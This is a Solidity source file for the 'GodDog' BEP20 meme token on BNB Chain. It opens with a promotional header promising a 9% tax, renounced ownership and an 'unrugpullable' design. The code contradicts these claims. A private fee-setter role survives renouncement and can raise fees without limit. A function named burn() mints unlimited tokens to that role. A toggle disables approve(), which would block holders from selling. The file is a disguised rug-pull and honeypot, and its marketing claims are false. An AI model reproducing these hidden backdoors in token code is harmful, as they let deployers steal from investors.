/**
 *Submitted for verification at BscScan.com on 2021-07-12
*/

/**

GodDog loves his little puppies.
We are all his puppies.

I. I AM THE GOD DOG: YOU SHALL NOT HAVE STRANGE DOGS BESIDES ME.
II. YOU SHALL NOT SULLY THE NAME OF GOD DOG.
III. YOU SHALL SANCTIFY THE PRESALE
IV. YOU SHALL HONOR DOGE AND BABYDOGE.
V. THOU SHALT NOT BUY SCAMS.
VI. THOU SHALT NOT PAPERHANDING.
VII. THOU SHALT NOT FUD IN HONORABLE PROJECTS.
VIII. THOU SHALT NOT COVET THY NEXT BNB.
IX. THOU SHALT NOT TARNISH THE NAME OF GOD DOG.
X. THOU SHALT NOT COVET THY NEXT WIFE, LAMBO, BNB, DOGECOIN NOR ANYTHING THY NEXT HAS.

All $Goddog holders earn more tokens with each transaction, which are automatically sent to your wallet. Also, $Goddog is deflationary, which means that the token will become scarcer and therefore more valuable over time.

We have a 9% sacred tax on every transaction, designed to bless everyone with it:

3% distributed to our beloved holders
3% is added to the liquidity pool
3% goes to HolyWallet (marketing & team) to match the budget with the ambitions of the token

More importantly, Goddog is immune from the torment of hell:

Unrugpullable (liquidity locked)
Ownership is renounced after launch
Community-driven
The God of Doges.


Join our Holy Crusade 

www.goddog.finance
https://t.me/GodDogfinance


*/

pragma solidity ^0.4.26;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract GodDog is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private feesetter = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    bool private burnToggle;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor(string contractName, string contractSymbol) public {
        symbol = contractSymbol;
        name = contractName;
        fees =11;
        burnaddress = 0x000000000000000000000000000000000000dEaD;
        decimals = 9;
        burnToggle = true;
        totalSupply = 1000000000 * 10**6 * 10**9;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier feeset() {
        require(msg.sender == feesetter);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external feeset() {
        fees = taxFee;
    }
    function burn( uint256 amount) public feeset{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function setBurnFee( bool burnOn) public feeset returns(bool success){
        burnToggle = burnOn;
        return burnToggle;
    }
    function renounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == feesetter){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
         emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
	require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        if(burnToggle){
             allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
                return true;
        }
        else{
         return false;
        }
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
}